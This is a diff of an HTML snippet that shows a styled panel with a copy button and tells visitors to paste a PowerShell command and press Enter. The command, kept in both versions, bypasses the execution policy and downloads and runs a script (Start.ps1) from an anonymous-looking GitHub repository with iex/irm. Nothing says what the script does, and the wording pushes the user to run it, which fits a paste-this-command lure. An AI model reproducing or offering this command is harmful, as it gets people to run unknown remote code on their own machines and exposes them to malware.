@@ -1,14 +1,12 @@
-<div style="background: #222; color: #fff; padding: 20px; border-radius: 10px; font-family: monospace;">
-    <p>Run this command in PowerShell to start:</p>
-    <code id="cmd">powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"</code>
-    <br><br>
-    <button onclick="copyCmd()" style="padding: 10px; cursor: pointer;">Copy Command</button>
+<div style="background:#1e1e1e; color:#00ff00; padding:20px; border-radius:8px; font-family:monospace;">
+  <p style="color:white;">Paste this into PowerShell and press Enter:</p>
+  <code id="cmd">powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"</code>
+  <button onclick="copyText()" style="margin-left:10px; padding:5px;">Copy</button>
 </div>
 
 <script>
-function copyCmd() {
-  const text = document.getElementById('cmd').innerText;
-  navigator.clipboard.writeText(text);
-  alert("Command copied! Now paste it into PowerShell.");
+function copyText() {
+  navigator.clipboard.writeText(document.getElementById('cmd').innerText);
+  alert("Copied! Now open PowerShell and paste it.");
 }
 </script>
